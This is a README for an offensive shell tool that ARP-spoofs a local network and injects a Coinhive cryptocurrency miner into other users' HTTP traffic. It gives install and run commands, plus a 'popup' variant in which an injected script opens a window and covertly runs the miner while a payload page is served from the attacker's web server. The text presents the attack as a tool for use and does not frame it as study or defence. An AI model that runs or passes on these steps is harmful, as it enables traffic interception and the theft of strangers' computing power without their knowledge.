
		

TO USE:	
	 
You will first need to make sure that you have `MitMf` and also `Twisted version 15.5.0`
To install dependencies run:
        `./xmrsbitch.sh --install`
	
   ----To use a simple miner attack----
	
   The standard network attack arp spoofs the network, then injects a miner into http responses.
   To launch a standard miner injection attack run:
      ` ./xmrsbitch.sh <coinhive api key> <gateway ip> <interface name>`
	
	
   ----To use a popup miner attack----
	
   A popup miner attack will attempt to inject a script into http responses. The script will wait for the user to click a button.
   When they do it will spawn a popup with their site in it and the orignal window will launch a miner 
	
   First run:
      ` ./xmrsbitch.sh --generate <coinhive api key>`
	
   and place payload.html into your web server root directory
	
   Second run:
    `   ./xmrsbitch.sh -p <gateway ip> <interface name> <web server ip>`
	
	

